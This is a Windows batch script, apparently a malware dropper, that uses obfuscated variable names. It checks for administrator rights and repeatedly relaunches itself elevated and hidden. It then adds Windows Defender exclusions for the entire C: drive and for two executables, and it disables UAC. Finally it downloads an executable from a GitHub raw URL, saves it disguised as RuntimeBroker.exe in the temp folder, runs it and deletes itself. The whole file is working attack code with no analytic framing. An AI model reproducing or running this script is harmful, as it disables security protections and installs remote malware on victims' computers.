@echo off & setlocal enableDelayedExpansion
set "fAIa=>nul" & set "tsRIc=SESSION" & set "zvB=NET" & set "PkYjM=2>&1"
%zvB% %tsRIc% %fAIa% %PkYjM%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "WUlzG=foo" & set "OWH=qux" & set "YYP=bar" & set "hKokE=baz" & rem hRH zKEYN SDTUh
set "QbJ=powershell -ExecutionPolicy Bypass -Command"
set "DYRM=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "sJuao='C:\' -ErrorAction SilentlyContinue"
!QbJ! "!DYRM! !sJuao!" %fAIa% %PkYjM%
set "frks=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
!QbJ! "!frks!" %fAIa% %PkYjM%
set "bjH=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!QbJ! "!bjH!" %fAIa% %PkYjM%
set "NWPv=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "hnys=-Name 'EnableLUA' -Value 0"
!QbJ! "!NWPv! !hnys!" %fAIa% %PkYjM%
set "QhxrY=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!QbJ! "!QhxrY!" %fAIa% %PkYjM%
if !errorlevel! neq 0 (goto %a%)
set "llnE=timeout /t" & !llnE! 2 %fAIa% %PkYjM%
set "DJMxx=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "YZCQO=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!QbJ! "!DJMxx! !YZCQO!" %fAIa% %PkYjM%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!llnE! 1 %fAIa% %PkYjM% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %fAIa% %PkYjM%
del /f /q "%~f0" %fAIa% %PkYjM%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %fAIa% %PkYjM%
if !errorlevel! neq 0 (!llnE! 3 %fAIa% %PkYjM% & goto %b%)
exit /b
